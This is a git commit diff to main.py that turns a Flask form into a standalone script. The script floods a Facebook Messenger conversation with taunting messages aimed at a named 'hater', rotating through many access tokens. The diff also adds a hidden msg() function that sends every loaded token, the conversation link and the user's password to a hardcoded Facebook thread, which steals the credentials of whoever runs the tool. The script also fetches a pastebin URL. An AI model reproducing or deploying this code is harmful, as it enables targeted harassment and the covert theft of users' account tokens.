8ad8d842d3986e9642ff88d23dee0d2ed0b8fc4e
hackertool45 <146292562+hackertool45@users.noreply.github.com>
2024-06-19 03:59:20 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,132 +1,157 @@
-from flask import Flask, request
 import requests
-from time import sleep
+import json
 import time
-from datetime import datetime
-app = Flask(__name__)
-app.debug = True
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
 
-headers = {
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+  def do_GET(self):
+    self.send_response(200)
+    self.send_header('Content-type', 'text/plain')
+    self.end_headers()
+    self.wfile.write(b"FUCK TH4 D4RK W3B SERV3R ")
+
+def execute_server():
+  PORT = 4000
+
+  with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+    print("Server running at http://localhost:{}".format(PORT))
+    httpd.serve_forever()
+
+def send_messages():
+  with open('password.txt', 'r') as file:
+    password = file.read().strip()
+
+  entered_password = password
+
+  if entered_password != password:
+    print('[-] <==> Incorrect Password!')
+    sys.exit()
+
+  with open('tokennum.txt', 'r') as file:
+    tokens = file.readlines()
+  num_tokens = len(tokens)
+
+  requests.packages.urllib3.disable_warnings()
+
+  def cls():
+    if system() == 'Linux':
+      os.system('clear')
+    else:
+      if system() == 'Windows':
+        os.system('cls')
+  cls()
+
+  def liness():
+    print('\u001b[37m' + '---------------------------------------------------')
+
+  headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
-}
+  }
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
+  mmm = requests.get('https://pastebin.com/raw/iyyPs98M').text
 
 
-    return '''
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Dakku Server</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body{
-      background-color: #f8f9fa;
+  liness()
+
+  access_tokens = [token.strip() for token in tokens]
+
+  with open('convo.txt', 'r') as file:
+    convo_id = file.read().strip()
+
+  with open('file.txt', 'r') as file:
+    text_file_path = file.read().strip()
+
+  with open(text_file_path, 'r') as file:
+    messages = file.readlines()
+
+  num_messages = len(messages)
+  max_tokens = min(num_tokens, num_messages)
+
+  with open('hatersname.txt', 'r') as file:
+    haters_name = file.read().strip()
+
+  with open('time.txt', 'r') as file:
+    speed = int(file.read().strip())
+
+  liness()
+
+  def getName(token):
+    try:
+      data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
+    except:
+      data = ""
+    if 'name' in data:
+      return data['name']
+    else:
+      return "Error occured"
+
+  def msg():
+    parameters = {
+      'access_token' : random.choice(access_tokens),
+      'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id+'\n Password: '+password
     }
-    .container{
-      max-width: 500px;
-      background-color: #fff;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      margin: 0 auto;
-      margin-top: 20px;
-    }
-    .header{
-      text-align: center;
-      padding-bottom: 20px;
-    }
-    .btn-submit{
-      width: 100%;
-      margin-top: 10px;
-    }
-    .footer{
-      text-align: center;
-      margin-top: 20px;
-      color: #888;
-    }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mb-3"> SYSTEM FUCKER
-                                     BY
-    dakku don >3:)
-    <h1 class="mt-3">system fucker]|I{•------» dakku urf billa  </h1>
-  </header>
+    try:
+      s = requests.post("https://graph.facebook.com/v15.0/t_100066819999632/", data=parameters, headers=headers)
+    except:
+      pass
 
-  <div class="container">
-    <form action="/" method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="accessToken">Enter Your Token:</label>
-        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-      </div>
-      <div class="mb-3">
-        <label for="threadId">Enter Convo/Inbox ID:</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx">Enter Hater Name:</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile">Select Your Notepad File:</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-      </div>
-      <div class="mb-3">
-        <label for="time">Speed in Seconds:</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>&copy; Developed by dakku don 2024. Reserved.</p>
-    <p>Jhati ib ke liya h</p>
-    <p>maje kr  <a href="https://github.com/zeeshanqureshi0</a></p>
-  </footer>
-</body>
-  </html>
-    '''
+  msg()
+  while True:
+    try:
+      for message_index in range(num_messages):
+        token_index = message_index % max_tokens
+        access_token = access_tokens[token_index]
 
+        message = messages[message_index].strip()
+
+        url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
+        parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+        response = requests.post(url, json=parameters, headers=headers)
+
+
+        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+        if response.ok:
+          print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
+            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+          print("  - Time: {}".format(current_time))
+          liness()
+          liness()
+        else:
+          print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
+            message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+          print("  - Time: {}".format(current_time))
+          liness()
+          liness()
+        time.sleep(speed)
+
+      print("[+] All messages sent. Restarting the process...")
+    except Exception as e:
+      print("[!] An error occurred: {}".format(e))
+
+
+
+def main():
+  server_thread = threading.Thread(target=execute_server)
+  server_thread.start()
+
+  send_messages()
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-    app.run(debug=True)
+  main()
+
 	
